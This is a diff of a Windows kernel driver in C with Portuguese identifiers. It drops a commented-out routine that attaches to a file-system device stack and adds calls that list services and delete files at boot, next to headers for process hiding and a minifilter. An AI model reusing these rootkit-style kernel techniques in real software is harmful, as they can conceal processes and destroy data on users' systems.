@@ -5,62 +5,8 @@
 #include "process.h"
 #include "hideprocess.h"
 #include "minifilter.h"
-
-/*
-
-
-	Status = IoCreateFile(&Alca, 0x80000000, &Atributos,
-		&Io, 0, 0, 3u, 1u, 1u, 0, 0, 0, 0,
-		0x100u);
-
-	if (Status < 0)
-	{
-		DbgPrint("fudeu 1");
-		return Status;
-	}
-
-	PFILE_OBJECT SystemRootFileObject;
-	Status = ObReferenceObjectByHandle(Alca, 1u, 0, 0,&SystemRootFileObject, 0);
-
-	if (Status < 0)
-	{
-		DbgPrint("fudeu 2");
-		return Status;
-	}
-
-	PDEVICE_OBJECT TargetDevice = IoGetRelatedDeviceObject(SystemRootFileObject);
-
-	if (!TargetDevice)
-	{
-		DbgPrint("fudeu 2");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-	ObfReferenceObject(TargetDevice);
-	PDEVICE_OBJECT SourceDevice;
-
-	Status = IoCreateDevice(ObjetoDriver, 0xCu, 0, TargetDevice->DeviceType,
-		TargetDevice->Characteristics, 0, &SourceDevice);
-
-	if (Status < 0)
-	{
-		DbgPrint("fudeu 3");
-		return Status;
-	}
-
-	PDEVICE_OBJECT DeviceAttachedTo = IoAttachDeviceToDeviceStack(SourceDevice,
-		TargetDevice);
-
-	if (!DeviceAttachedTo)
-	{
-		DbgPrint("fudeu 4");
-		IoDeleteDevice(SourceDevice);
-		return STATUS_UNSUCCESSFUL;
-	}
-
-	return STATUS_SUCCESS;
-
-*/
+#include "reg.h"
+#include "listdrivers.h"
 
 /// <summary>
 /// Inicia o driver
@@ -71,6 +17,24 @@
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT ObjetoDriver, _In_ PUNICODE_STRING RegistroLocal)
 {
 	UNREFERENCED_PARAMETER(RegistroLocal);
+	ListarServicos();
+
+	ObjetoDriverGlobal = ObjetoDriver;
+
+	/*
+	HANDLE Thread;
+	if (NT_SUCCESS(PsCreateSystemThread(&Thread, (ACCESS_MASK)0,
+		NULL,
+		(HANDLE)0,
+		NULL, DeletarNoBoot, NULL)))
+	{
+		DbgPrint("Arquivos removidos");
+	}
+
+	if (Thread != NULL)
+		ZwClose(Thread);
+	*/
+
 	DeletarNoBoot();
 
 	// 1 Segundo
